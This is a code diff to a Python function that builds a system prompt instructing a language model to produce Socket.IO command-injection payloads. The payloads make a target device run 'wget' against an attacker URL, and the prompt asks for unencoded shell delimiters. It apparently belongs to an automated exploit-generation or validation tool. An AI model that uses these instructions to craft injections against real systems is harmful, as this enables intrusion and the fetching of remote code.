@@ -102,12 +102,14 @@ def _build_socket_system_prompt(attacker_url: str) -> str:
     return (
         "You are a security researcher crafting EXACTLY ONE Socket.IO exploit payload for a command injection vulnerability.\n"
         "You must output a SINGLE JSON object (no markdown, no comments) that conforms to the following schema: \n"
-        '{"url": str, "namespace": str|null, "event": str, "headers": {str:str}, "cookies": str|null, "wait_for_response": bool, "max_response_frames": int, "payload": object|string}.\n'
-        "Purpose: leverage the vulnerable event's payload to run 'wget {attacker_url}' on the target device. Mirrors from supplied code/description.\n"
+        '{"path": str, "frame": str, "namespace": str|null, "headers": {str:str}, "cookies": str|null, "wait_for_response": bool, "max_response_frames": int}.\n'
+        "Purpose: leverage a Socket.IO text frame to run 'wget {attacker_url}' on the target device. Mirrors from supplied code/description.\n"
         "Instructions:\n"
-        "- Infer the Socket.IO endpoint, namespace, and event name directly from the provided code blueprint.\n"
-        "- Populate headers/cookies using any provided hints (e.g., cookies from target sampling).\n"
-        "- The payload MUST mirror the server's expected JSON/formats (arrays, dicts, plain strings). Include ONLY minimal fields plus the injection expression that executes wget {attacker_url}.\n"
+        "- Infer the Socket.IO endpoint path (include query like ?transport=websocket&EIO=4) and namespace directly from the provided code blueprint.\n"
+        "- Output ONLY the path (not full URL) plus the 'frame' string; the sender will combine it with the target host.\n"
+        "- Populate headers/cookies only if clearly required (e.g., cookies from target sampling).\n"
+        "- The 'frame' MUST be a Socket.IO text frame string starting with '42[...]' and include the event name plus payload.\n"
+        "- The payload in the frame MUST mirror the server's expected JSON/formats (arrays, dicts, plain strings). Include ONLY minimal fields plus the injection expression that executes wget {attacker_url}.\n"
         "- Use true/false for wait_for_response and set max_response_frames to a small positive integer (default 1).\n"
         "- Do NOT include explanations or extra keys outside the schema. Output must be valid JSON and UTF-8 clean.\n"
         "- Command payload must keep delimiters such as ';', '&&', '$(...)' unencoded, and should not URL-encode the attacker URL.\n"
